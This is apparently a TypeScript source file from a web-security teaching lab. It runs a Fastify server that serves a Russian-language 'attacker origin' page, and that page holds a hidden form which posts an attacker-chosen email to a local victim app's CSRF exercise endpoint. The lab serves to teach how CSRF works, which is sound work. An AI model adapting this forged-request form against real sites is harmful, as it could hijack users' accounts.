import Fastify from "fastify";

export interface CreateCsrfAttackerOptions {
  victimPort?: number;
}

const createAttackerPage = (victimPort: number) => `<!doctype html>
<html lang="ru">
  <head><meta charset="utf-8"><title>CSRF attacker origin</title></head>
  <body>
    <main>
      <h1>Межсайтовая форма</h1>
      <p>Эта страница может отправить форму на сайт-жертву, но не может прочитать iframe: другой порт — другой origin.</p>
      <form id="csrf-attack" data-victim-port="${victimPort}" method="post" target="csrf-result">
        <input type="hidden" name="email" value="attacker-controlled@example.test">
        <button type="submit">Отправить межсайтовый запрос</button>
      </form>
      <iframe name="csrf-result" title="Ответ сайта-жертвы"></iframe>
      <script>
        const form = document.getElementById("csrf-attack");
        form.action = "http://" + location.hostname + ":" + form.dataset.victimPort + "/api/csrf/exercise/email";
      </script>
    </main>
  </body>
</html>`;

const hasNoQuery = (query: unknown): boolean =>
  query !== null && typeof query === "object" && !Array.isArray(query) && Object.keys(query).length === 0;

export function createCsrfAttacker({ victimPort = 8080 }: CreateCsrfAttackerOptions = {}) {
  const app = Fastify();
  const attackerPage = createAttackerPage(victimPort);

  app.get("/", async (request, reply) => {
    if (!hasNoQuery(request.query)) return reply.code(400).send({ error: "query parameters are not allowed" });
    return reply.type("text/html; charset=utf-8").send(attackerPage);
  });
  app.get("/health", async (request, reply) => {
    if (!hasNoQuery(request.query)) return reply.code(400).send({ error: "query parameters are not allowed" });
    return { status: "ok", service: "csrf-attacker" };
  });

  return app;
}
